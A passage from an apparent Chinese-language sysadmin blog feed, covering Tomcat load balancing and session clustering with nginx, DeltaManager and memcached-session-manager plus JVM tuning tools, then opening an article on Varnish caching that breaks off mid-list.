http://127.0.0.1:8080; &#125;&#125;[root@tomcat-node-1 ~]# vim /etc/tomcat/server.xml&lt;Server port=&quot;-1&quot; shutdown=&quot;SHUTDOWN&quot;&gt; &lt;Service name=&quot;Catalina&quot;&gt; &lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; &lt;Engine name=&quot;Catalina&quot; defaultHost=&quot;node1.fenghong.tech&quot; jvmRoute=&quot;TomcatA&quot;&gt; &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;node1-dongfei-tech_access.&quot; suffix=&quot;.log&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;/Host&gt; &lt;/Engine&gt; &lt;/Service&gt;&lt;/Server&gt;[root@tomcat-node-1 ~]# vim /data/webapp/ROOT/index.jsp&lt;%@ page language=&quot;java&quot; %&gt;&lt;html&gt; &lt;head&gt;&lt;title&gt;TomcatA&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;font color=&quot;red&quot;&gt;TomcatA.fenghong.tech&lt;/font&gt;&lt;/h1&gt; &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;Session ID&lt;/td&gt; &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt; &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Created on&lt;/td&gt; &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt;[root@tomcat-node-1 ~]# systemctl start nginx tomcat tomcat-node-2： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@tomcat-node-2 ~]# vim /etc/nginx/conf.d/nginx_tomcat.confserver &#123; listen 80 default_server; server_name node2.fenghong.tech; index index.jsp index.html; location / &#123; root &quot;/data/webapp/ROOT/&quot;; &#125; location ~* \.(jsp|do)$ &#123; proxy_pass http://127.0.0.1:8080; &#125;&#125;[root@tomcat-node-2 ~]# vim /etc/tomcat/server.xml&lt;Server port=&quot;-1&quot; shutdown=&quot;SHUTDOWN&quot;&gt; &lt;Service name=&quot;Catalina&quot;&gt; &lt;Connector address=&quot;127.0.0.1&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; &lt;Engine name=&quot;Catalina&quot; defaultHost=&quot;node2.fenghong.tech&quot; jvmRoute=&quot;TomcatB&quot;&gt; &lt;Host name=&quot;node2.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;node2-dongfei-tech_access.&quot; suffix=&quot;.log&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;/Host&gt; &lt;/Engine&gt; &lt;/Service&gt;&lt;/Server&gt;[root@tomcat-node-2 ~]# vim /data/webapp/ROOT/index.jsp &lt;%@ page language=&quot;java&quot; %&gt;&lt;html&gt; &lt;head&gt;&lt;title&gt;TomcatB&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;font color=&quot;blue&quot;&gt;TomcatB.fenghong.tech&lt;/font&gt;&lt;/h1&gt; &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;Session ID&lt;/td&gt; &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt; &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Created on&lt;/td&gt; &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt;[root@tomcat-node-2 ~]# systemctl start nginx tomcat 测试访问：http://www.fenghong.tech/；实现同一cookie的客户端调度到同一后端server上 httpd反代启用管理接口： 12345&lt;Location /balancer-manager&gt; SetHandler balancer-manager ProxyPass ! Require all granted&lt;/Location&gt; nginx + nginx + tomcat cluster：基于源地址hash调度前端nginx调度器： 1234567891011121314[root@Director ~]# vim /etc/nginx/conf.d/nginx_tomcat.confupstream tcsrvs &#123; ip_hash; server 192.168.0.10:80; server 192.168.0.11:80;&#125;server &#123; listen 80; server_name www.fenghong.tech; location / &#123; proxy_pass http://tcsrvs; &#125;&#125;[root@Director ~]# nginx tomcat-node-1和tomcat-node-2：参考以上配置 测试访问：http://www.fenghong.tech/；实现同一IP的客户端调度到同一后端server上 Tomcat的会话集群 session cluster：delta session manager；会话集群，对带宽消耗较大，集群规模建议3-5台 默认多播地址：228.0.0.4 多播通信使用的端口：45564 IP广播的方式来实现获取主机名，主机IP地址等，不能是监听在127.0.0.1 侦听复制消息的TCP端口是范围：4000-4100 必须配置集群会话监听器 各集群时间必须同步 前端nginx配置： 1234567891011upstream tcsrvs &#123; server 192.168.0.10:80; server 192.168.0.11:80;&#125;server &#123; listen 80; server_name www.fenghong.tech; location / &#123; proxy_pass http://tcsrvs; &#125;&#125; tomcat-node-1： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465[root@tomcat-node-1 ~]# vim /etc/tomcat/server.xml &lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Cluster className=&quot;org.apache.catalina.ha.tcp.SimpleTcpCluster&quot; channelSendOptions=&quot;8&quot;&gt;#channelSendOptions：发送消息的信道选项，0-15 &lt;Manager className=&quot;org.apache.catalina.ha.session.DeltaManager&quot; expireSessionsOnShutdown=&quot;false&quot; notifyListenersOnReplication=&quot;true&quot;/&gt;#Manager：定义新的会话管理器DeltaManager#expireSessionsOnShutdown：一旦把当前Tomcat节点关闭，是否将这节点的Tomcat会话失效，false表示不失效#notifyListenersOnReplication：现在如果要发送资源同步给其他节点，是否通知侦听器资源变动，必须打开 &lt;Channel className=&quot;org.apache.catalina.tribes.group.GroupChannel&quot;&gt; &lt;Membership className=&quot;org.apache.catalina.tribes.membership.McastService&quot; address=&quot;228.0.0.4&quot; port=&quot;45564&quot; frequency=&quot;500&quot; dropTime=&quot;3000&quot;/&gt; #McastService：多播通信 #address：多播通信地址 #port：端口 #frequency：每隔多长时间发送一次自己的心跳信息，单位ms #dropTime：在3000ms内没有收到对方的心跳信息表示已经不是集群成员了 &lt;Receiver className=&quot;org.apache.catalina.tribes.transport.nio.NioReceiver&quot; address=&quot;192.168.0.10&quot; port=&quot;4000&quot; autoBind=&quot;100&quot; selectorTimeout=&quot;5000&quot; maxThreads=&quot;6&quot;/&gt; #NioReceiver：异步IO #address：监听地址，需要修改为集群成员通信的网卡 #port：端口，如果不指定则自动选择4000-4100内从4000开始选择一个没有被占用的端口 #autoBind：自动绑定 #selectorTimeout：挑选器的超时时长 #maxThreads：最大线程数，集群成员节点数 - 1 &lt;Sender className=&quot;org.apache.catalina.tribes.transport.ReplicationTransmitter&quot;&gt; &lt;Transport className=&quot;org.apache.catalina.tribes.transport.nio.PooledParallelSender&quot;/&gt; &lt;/Sender&gt; &lt;Interceptor className=&quot;org.apache.catalina.tribes.group.interceptors.TcpFailureDetector&quot;/&gt; &lt;Interceptor className=&quot;org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor&quot;/&gt; &lt;/Channel&gt;#Channel：定义多播集群通信信道#Membership：定义成员关系#Receiver：接受器#Sender：将自己的会话资源变动同步给其他节点 &lt;Valve className=&quot;org.apache.catalina.ha.tcp.ReplicationValve&quot; filter=&quot;&quot;/&gt; &lt;Valve className=&quot;org.apache.catalina.ha.session.JvmRouteBinderValve&quot;/&gt; &lt;Deployer className=&quot;org.apache.catalina.ha.deploy.FarmWarDeployer&quot; tempDir=&quot;/tmp/war-temp/&quot; deployDir=&quot;/tmp/war-deploy/&quot; watchDir=&quot;/tmp/war-listen/&quot; watchEnabled=&quot;false&quot;/&gt; &lt;ClusterListener className=&quot;org.apache.catalina.ha.session.JvmRouteSessionIDBinderListener&quot;/&gt; &lt;ClusterListener className=&quot;org.apache.catalina.ha.session.ClusterSessionListener&quot;/&gt; &lt;/Cluster&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;node1-dongfei-tech_access.&quot; suffix=&quot;.log&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;/Host&gt;[root@tomcat-node-1 ~]# mkdir /data/webapp/ROOT/WEB-INF[root@tomcat-node-1 ~]# cp /etc/tomcat/web.xml /data/webapp/ROOT/WEB-INF/[root@tomcat-node-1 ~]# vim /data/webapp/ROOT/WEB-INF/web.xml &lt;distributable/&gt; #添加到web-app内[root@tomcat-node-1 ~]# systemctl restart tomcat tomcat-node-2： 123456789101112131415161718192021222324252627282930313233343536373839404142434445[root@tomcat-node-2 ~]# vim /etc/tomcat/server.xml &lt;Host name=&quot;node2.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Cluster className=&quot;org.apache.catalina.ha.tcp.SimpleTcpCluster&quot; channelSendOptions=&quot;8&quot;&gt; &lt;Manager className=&quot;org.apache.catalina.ha.session.DeltaManager&quot; expireSessionsOnShutdown=&quot;false&quot; notifyListenersOnReplication=&quot;true&quot;/&gt; &lt;Channel className=&quot;org.apache.catalina.tribes.group.GroupChannel&quot;&gt; &lt;Membership className=&quot;org.apache.catalina.tribes.membership.McastService&quot; address=&quot;228.0.0.4&quot; port=&quot;45564&quot; frequency=&quot;500&quot; dropTime=&quot;3000&quot;/&gt; &lt;Receiver className=&quot;org.apache.catalina.tribes.transport.nio.NioReceiver&quot; address=&quot;192.168.0.11&quot; port=&quot;4000&quot; autoBind=&quot;100&quot; selectorTimeout=&quot;5000&quot; maxThreads=&quot;6&quot;/&gt; &lt;Sender className=&quot;org.apache.catalina.tribes.transport.ReplicationTransmitter&quot;&gt; &lt;Transport className=&quot;org.apache.catalina.tribes.transport.nio.PooledParallelSender&quot;/&gt; &lt;/Sender&gt; &lt;Interceptor className=&quot;org.apache.catalina.tribes.group.interceptors.TcpFailureDetector&quot;/&gt; &lt;Interceptor className=&quot;org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor&quot;/&gt; &lt;/Channel&gt; &lt;Valve className=&quot;org.apache.catalina.ha.tcp.ReplicationValve&quot; filter=&quot;&quot;/&gt; &lt;Valve className=&quot;org.apache.catalina.ha.session.JvmRouteBinderValve&quot;/&gt; &lt;Deployer className=&quot;org.apache.catalina.ha.deploy.FarmWarDeployer&quot; tempDir=&quot;/tmp/war-temp/&quot; deployDir=&quot;/tmp/war-deploy/&quot; watchDir=&quot;/tmp/war-listen/&quot; watchEnabled=&quot;false&quot;/&gt; &lt;ClusterListener className=&quot;org.apache.catalina.ha.session.JvmRouteSessionIDBinderListener&quot;/&gt; &lt;ClusterListener className=&quot;org.apache.catalina.ha.session.ClusterSessionListener&quot;/&gt; &lt;/Cluster&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;node2-dongfei-tech_access.&quot; suffix=&quot;.log&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;/Host&gt;[root@tomcat-node-2 ~]# mkdir /data/webapp/ROOT/WEB-INF[root@tomcat-node-2 ~]# cp /etc/tomcat/web.xml /data/webapp/ROOT/WEB-INF[root@tomcat-node-2 ~]# vim /data/webapp/ROOT/WEB-INF/web.xml &lt;distributable/&gt; #添加到web-app内[root@tomcat-node-2 ~]# systemctl restart tomcat 需要在前端调度器做将会话绑定，配置后端的Tomcat会话集群一同使用 使用mencached保存Tomcat会话信息 session server：redis(store), memcached(cache)；利用会话服务器保存会话信息 mencached配置： 12345[root@mem-1 ~]# yum install memcached -y[root@mem-1 ~]# systemctl start memcached[root@mem-1 ~]# ss -tnl |grep 11211LISTEN 0 128 *:11211 *:*LISTEN 0 128 :::11211 :::* msm配置：在tomcat服务器中配置 项目地址：https://github.com/magro/memcached-session-manager 123456789101112131415161718192021222324252627282930[root@tomcat-node-1 ~]# mkdir msm[root@tomcat-node-1 ~]# cd msm[root@tomcat-node-1 msm]# wget http://repo1.maven.org/maven2/de/javakaffee/msm/memcached-session-manager/2.3.0/memcached-session-manager-2.3.0.jar[root@tomcat-node-1 msm]# wget http://repo1.maven.org/maven2/de/javakaffee/msm/memcached-session-manager-tc7/2.3.0/memcached-session-manager-tc7-2.3.0.jar[root@tomcat-node-1 msm]# wget http://repo1.maven.org/maven2/net/spy/spymemcached/2.12.3/spymemcached-2.12.3.jar[root@tomcat-node-1 msm]# mkdir kryo[root@tomcat-node-1 msm]# cd kryo/[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/de/javakaffee/msm/msm-kryo-serializer/2.3.0/msm-kryo-serializer-2.3.0.jar[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/de/javakaffee/kryo-serializers/0.42/kryo-serializers-0.42.jar[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/com/esotericsoftware/kryo/4.0.2/kryo-4.0.2.jar[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/com/esotericsoftware/minlog/1.3.0/minlog-1.3.0.jar[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/com/esotericsoftware/reflectasm/1.11.7/reflectasm-1.11.7.jar[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/org/ow2/asm/asm/6.2/asm-6.2.jar[root@tomcat-node-1 kryo]# wget http://repo1.maven.org/maven2/org/objenesis/objenesis/2.6/objenesis-2.6.jar[root@tomcat-node-1 ~]# tree msm/msm/├── kryo│ ├── asm-6.2.jar│ ├── kryo-4.0.2.jar│ ├── kryo-serializers-0.42.jar│ ├── minlog-1.3.0.jar│ ├── msm-kryo-serializer-2.3.0.jar│ ├── objenesis-2.6.jar│ └── reflectasm-1.11.7.jar├── memcached-session-manager-2.3.0.jar├── memcached-session-manager-tc7-2.3.0.jar└── spymemcached-2.12.3.jar[root@tomcat-node-1 ~]# cp msm/*.jar /usr/share/java/tomcat/[root@tomcat-node-1 ~]# scp msm/*.jar 192.168.0.11:/usr/share/java/tomcat/[root@tomcat-node-1 ~]# scp msm/kryo/*.jar 192.168.0.11:/usr/share/java/tomcat/ tomcat-1配置： 123456789101112131415161718192021222324252627282930313233[root@tomcat-node-1 ~]# vim /etc/tomcat/server.xml&lt;Host name=&quot;node1.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Context path=&quot;/&quot; docBase=&quot;ROOT&quot; reloadable=&quot;&quot;&gt; &lt;Manager className=&quot;de.javakaffee.web.msm.MemcachedBackupSessionManager&quot; memcachedNodes=&quot;n1:192.168.0.12:11211,n2:192.168.0.13:11211&quot; failoverNodes=&quot;n2&quot; requestUriIgnorePattern=&quot;.*\.(ico|png|gif|jpg|css|js)$&quot; transcoderFactoryClass=&quot;de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory&quot; /&gt; &lt;/Context&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;node1-dongfei-tech_access.&quot; suffix=&quot;.log&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;&lt;/Host&gt;[root@tomcat-node-1 ~]# cat /data/webapp/ROOT/index.jsp &lt;%@ page language=&quot;java&quot; %&gt;&lt;html&gt; &lt;head&gt;&lt;title&gt;TomcatA&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;font color=&quot;red&quot;&gt;TomcatA.fenghong.tech&lt;/font&gt;&lt;/h1&gt; &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;Session ID&lt;/td&gt; &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt; &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Created on&lt;/td&gt; &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt; tomcat-2配置： 123456789101112131415161718192021222324252627282930313233[root@tomcat-node-2 ~]# vim /etc/tomcat/server.xml&lt;Host name=&quot;node2.fenghong.tech&quot; appBase=&quot;/data/webapp&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Context path=&quot;/&quot; docBase=&quot;ROOT&quot; reloadable=&quot;&quot;&gt; &lt;Manager className=&quot;de.javakaffee.web.msm.MemcachedBackupSessionManager&quot; memcachedNodes=&quot;n1:192.168.0.12:11211,n2:192.168.0.13:11211&quot; failoverNodes=&quot;n2&quot; requestUriIgnorePattern=&quot;.*\.(ico|png|gif|jpg|css|js)$&quot; transcoderFactoryClass=&quot;de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory&quot; /&gt; &lt;/Context&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;node2-dongfei-tech_access.&quot; suffix=&quot;.log&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;&lt;/Host&gt;[root@tomcat-node-2 ~]# cat /data/webapp/ROOT/index.jsp &lt;%@ page language=&quot;java&quot; %&gt;&lt;html&gt; &lt;head&gt;&lt;title&gt;TomcatB&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;font color=&quot;blue&quot;&gt;TomcatB.fenghong.tech&lt;/font&gt;&lt;/h1&gt; &lt;table align=&quot;centre&quot; border=&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;Session ID&lt;/td&gt; &lt;% session.setAttribute(&quot;fenghong.tech&quot;,&quot;fenghong.tech&quot;); %&gt; &lt;td&gt;&lt;%= session.getId() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Created on&lt;/td&gt; &lt;td&gt;&lt;%= session.getCreationTime() %&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt; 测试： 访问www.fenghong.tech查看会话是否会变动 将memcached-1停止会话是否正常保持 Tomcat的常用优化配置 /etc/sysconfig/tomcat, /etc/tomcat/tomcat.conf 内存空间： 123456JAVA_OPTS=&quot;-server -Xms32g -Xmx32g -XX:NewSize= -XX:MaxNewSize= &quot; -server：服务器模式 -Xms：堆内存初始化大小； -Xmx：堆内存空间上限； -XX:NewSize=：新生代空间初始化大小； -XX:MaxNewSize=：新生代空间最大值； 线程池设置： 1234567891011&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; maxThreads：最大线程数； minSpareThreads：最小空闲线程数； maxSpareThreads：最大空闲线程数； acceptCount：等待队列的最大长度； URIEncoding：URI地址编码格式，建议使用UTF-8； enableLookups：是否启用dns解析，建议禁用； compression：是否启用传输压缩机制，建议“on&quot;; compressionMinSize：启用压缩传输的数据流最小值，单位是字节； compressableMimeType：定义启用压缩功能的MIME类型； text/html, text/xml, text/css, text/javascript 禁用8005端口； 1&lt;Server port=&quot;-1&quot; shutdown=&quot;SHUTDOWN&quot;&gt; 隐藏版本信息： 12&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; Server=&quot;SOME STRING&quot; JVM内存分配参数： 123456-Xmx：堆内存（新生代和老年代）的最大空间；-Xms：初始分配内存空间；-XX:NewSize：新生代空间大小； -Xms-(-XX:NewSize)-XX:MaxNewSize：新生代的最大空间； -Xmx-（-XX:MaxNewSize） 指定垃圾收集器：-XX: 123456789UseSerialGC：运行于Client模式下，新生代是Serial, 老年代使用SerialOldUseParNewGC：新生代使用ParNew，老年代使用SerialOldUseParalellGC：运行于server模式下，新生代使用Serial Scavenge, 老年代使用SerialOldUseParalessOldGC：新生代使用Paralell Scavenge, 老年代使用Paralell OldUseConcMarkSweepGC：新生代使用ParNew, 老年代优先使用CMS，备选方式为Serial Old CMSInitiatingOccupancyFraction：设定老年代空间占用比例达到多少后触发回收操作，默认为68%； UseCMSCompactAtFullCollection：CMS完成内存回收后是否要进行内存碎片整理； CMSFullGCsBeforeCompaction：在多次回收后执行一次内存碎片整理；ParalellGCThreads：并行GC线程的数量； JVM常用的分析工具： jps：用来查看运行的所有jvm进程； jinfo：查看进程的运行环境参数，主要是jvm命令行参数； jstat：对jvm应用程序的资源和性能进行实时监控； jstack：查看所有线程的运行状态； jmap：查看jvm占用物理内存的状态； jhat：+UseParNew jconsole： jvisualvm： jps：Java virutal machine Process Status tool 1234567jps [-q] [-mlvV] [&lt;hostid&gt;] -q：静默模式； -v：显示传递给jvm的命令行参数； -m：输出传入main方法的参数； -l：输出main类或jar完全限定名称； -V：显示通过flag文件传递给jvm的参数； [&lt;hostid&gt;]：主机id，默认为localhost； jinfo：输出给定的java进程的所有配置信息 1234jinfo [option] &lt;pid&gt; -flags：to print VM flags -sysprops：to print Java system properties -flag &lt;name&gt;：to print the value of the named VM flag jstack：查看指定的java进程的线程栈的相关信息 12345jstack [-l] &lt;pid&gt;jstack -F [-m] [-l] &lt;pid&gt; -l：long listings，会显示额外的锁信息，因此，发生死锁时常用此选项； -m：混合模式，既输出java堆栈信息，也输出C/C++堆栈信息； -F：当使用“jstack -l PID&quot;无响应，可以使用-F强制输出信息； jstat：输出指定的java进程的统计信息 123456789101112131415161718192021jstat -&lt;option&gt; [-t] [-h&lt;lines&gt;] &lt;vmid&gt; [&lt;interval&gt; [&lt;count&gt;]]-option： -class：class loader -compiler：JIT -gc：gc YGC：新生代的垃圾回收次数； YGCT：新生代垃圾回收消耗的时长； FGC：Full GC的次数； FGCT：Full GC消耗的时长； GCT：GC消耗的总时长； -gccapacity：统计堆中各代的容量 -gccause： -gcmetacapacity -gcnew：新生代 -gcnewcapacity -gcold：老年代 -gcoldcapacity -gcutil -printcompilationinterval：时间间隔，单位是毫秒；count：显示的次数； jmap：Memory Map, 用于查看堆内存的使用状态 jhat：Java Heap Analysis Tool 12345678jmap [option] &lt;pid&gt;jmap -heap &lt;pid&gt; #查看堆空间的详细信息jmap -histo[:live] &lt;pid&gt; #查看堆内存中的对象的数目,live：只统计活动对象jmap -dump:&lt;dump-options&gt; &lt;pid&gt; #保存堆内存数据至文件中，而后使用jvisualvm或jhat进行查看 dump-options: live format=b file=&lt;file&gt; 感谢阅读！]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Varnish]]></title>
    <url>%2Fvarnish.html</url>
    <content type="text"><![CDATA[摘要： 缓存相关的概念 varnish的介绍 varnish的管理及配置 多主机调度功能实现 ansible实现varnish 缓存相关概念简述 时间局部性：一个数据被访问过之后，可能很快会被再次访问到； 空间局部性：一个数据被访问时，其周边的数据也有可能被访问到 数据缓存：例如MySQL到web应用服务器之间的缓存服务器缓存的资源是数据缓存 页面缓存：接入层和应用层中间的缓存服务器缓存的是可缓存的页面，这层就是缓存层 缓存命中率：hit/(hit+miss)，一般高于30%命中率则是正向收益，好的设计系统可以达到80%到95%以上 字节命中率：按照数据的字节大小来计算命中率 请求命中率：按照请求的数量来计算命中率 代理式缓存：客户端访问缓存服务器，缓存服务器没有命中缓存时到后端服务器请求数据，此时它作为反向代理服务器工作，这种类型的缓存服务器叫做代理式缓存 旁挂式缓存：客户端亲自去查询数据库，并且将数据复制给缓存服务器一份，下次先去找缓存服务器，如果没有命中则再去数据库服务器查询，此时这种工作方式的缓存叫做旁挂式缓存，这个客户端叫做胖客户端（smart client） private cache：私有缓存，用户代理附带的本地缓存机制 public cache：公共缓存，反向代理服务器的缓存功能 CND：Content Delivery Network 内容投递系统 GSLB：全网均衡调度 缓存有效性判断机制： 过期时间 条件式验证 Last-Modified/If-Modified-Since：基于文件的修改时间戳来判别 Etag/If-None-Match：基于文件的校验码来判别 过期时间验证缓存是否失效颗粒度太大，如果页面刚刚缓存应用服务器发生了变化，结果客户端拿到的就是过期数据；从而加入了条件式验证缓存的失效性，每次客户端请求到达缓存服务器，缓存服务器都要拿本地的数据和应用服务器的数据比较时间戳，如果时间戳发生了变化则缓存新的数据；这样虽然粒度小了，但是还是会有问题，如果应用服务器在同一秒页面数据变化了三次，而缓存服务器拿到的是第一份数据，这样还是会发生数据失效的问题；从而又引入了Etag（扩展标记）来标记唯一的页面数据。此时虽然解决了数据失效性的问题，但是每次客户端的请求都要去后端服务器做比较，对缓存和应用服务器都是不小的压力，我们不得不采取折中的解决方案就是“过期时间验证+条件式验证”，将不经常变动的页面做过期时间验证，变动频繁的采用条件式验证。 请求报文用于通知缓存服务如何使用缓存响应请求： 123456789cache-request-directive = &quot;no-cache&quot; 不能使用缓存系统中的缓存响应我，必须先去应用服务器做缓存验证&quot;no-store&quot; 不能使用缓存系统中的缓存响应我，必须去应用服务器请求响应我&quot;max-age&quot; &quot;=&quot; delta-seconds &quot;max-stale&quot; [ &quot;=&quot; delta-seconds ]&quot;min-fresh&quot; &quot;=&quot; delta-seconds&quot;no-transform&quot;&quot;only-if-cached&quot;cache-extension 响应报文用于通知缓存服务器如何存储上级服务器响应的内容： 1234567891011cache-response-directive =&quot;public&quot; 所有缓存系统都可以缓存&quot;private&quot; [ &quot;=&quot; &lt;&quot;&gt; 1#field-name &lt;&quot;&gt; ] 仅能够被私有缓存所缓存&quot;no-cache&quot; [ &quot;=&quot; &lt;&quot;&gt; 1#field-name &lt;&quot;&gt; ]，可缓存，但响应给客户端之前需要revalidation，即必须发出条件式请求进行缓存有效性验正&quot;no-store&quot; ，不允许存储响应内容于缓存中&quot;no-transform&quot; 不能转换格式&quot;must-revalidate&quot; 必须重新验证&quot;proxy-revalidate&quot; &quot;max-age&quot; &quot;=&quot; delta-seconds 私有缓存最大缓存时长&quot;s-maxage&quot; &quot;=&quot; delta-seconds 公共缓存最大缓存时长cache-extension Web Page Cache解决方案：squid和varnish，它们的关系就像Apache和Nginx varnish介绍Varnish cache，或称Varnish，是一套高性能的反向网站缓存服务器（reverse proxy server） varnish官方站点： http://www.varnish-cache.org/ varnish拥有俩套配置文件；一套配置文件用于varnish自身进程的参数配置，另一套用于定义缓存规则；定义缓存规则需要使用灵活的语言来定义，这就是VCL（varnish语言）；应用时需要将VCL编写的规则送给VCC编译后才能运行，所以安装varnish需要依赖gcc编译器。 varnish的安装：yum install varnish -y，依赖epel源，目前CentOS7的epel源提供的版本是v4.0.5 varnish的程序环境： /etc/varnish/varnish.params： 配置varnish服务进程的工作特性，例如监听的地址和端口，缓存机制 /etc/varnish/default.vcl：配置各Child/Cache线程的缓存策略 /usr/sbin/varnishd：主程序 /usr/bin/varnishadm：命令行工具 /usr/bin/varnishhist： /usr/bin/varnishlog：查看内存中的日志 /usr/bin/varnishncsa：以NCSA格式查看日志 /usr/bin/varnishstat：查看缓存日志状态信息 /usr/bin/varnishtop：以rank方式查看日志 /usr/bin/varnishtest：测试工具程序 /usr/sbin/varnish_reload_vcl：VCL配置文件重载程序 /usr/lib/systemd/system/varnish.service：varnish服务 /usr/lib/systemd/system/varnishlog.service：日志持久的服务 /usr/lib/systemd/system/varnishncsa.service：日志持久的服务 管理工具varnishd -s [name=]type[,options] ：定义缓存数据的存储方式 malloc[,size]：内存存储，[,size]用于定义空间大小；重启后所有缓存项失效 file[,path[,size[,granularity]]]：磁盘文件存储，黑盒；重启后所有缓存项失效 persistent,path,size：文件存储，黑盒；重启后所有缓存项有效；实验阶段，不建议使用 -a address[:port][,address[:port][…]：服务监听端口，默认为6081端口 -T address[:port]：管理服务监听端口，默认为6082端口 -f config：VCL配置文件 -F：运行于前台 -p param=value：设定运行参数及其值； 可重复使用多次 -r param[,param…]: 设定指定的参数为只读状态 varnishstat1# varnishstat -1 -f MAIN.cache_hit -f MAIN.cache_miss #显示指定参数的当前统计数据 1# varnishstat -l -f MAIN -f MEMPOOL #列出指定配置段的每个参数的意义 varnishtop -1：打印统计信息一次并退出，而不是持续更新的显示 -i taglist：可以同时使用多个-i选项，也可以一个选项跟上多个标签 -I \&lt;[taglist:]regex>：对指定的标签的值基于regex进行过滤 -x taglist：排除列表 -X \&lt;[taglist:]regex>：对指定的标签的值基于regex进行过滤，符合条件的予以排除 varnishadm1# varnishadm -S /etc/varnish/secret -T 127.0.0.1:6082 #登录管理程序 1234567891011121314151617181920212223help [&lt;command&gt;] 获取帮助ping [&lt;timestamp&gt;] 测试服务器auth &lt;response&gt;quit 退出clibannerstatus 显示状态start 启动stop 停止vcl.load &lt;configname&gt; &lt;filename&gt; 加载VCL配置文件vcl.inline 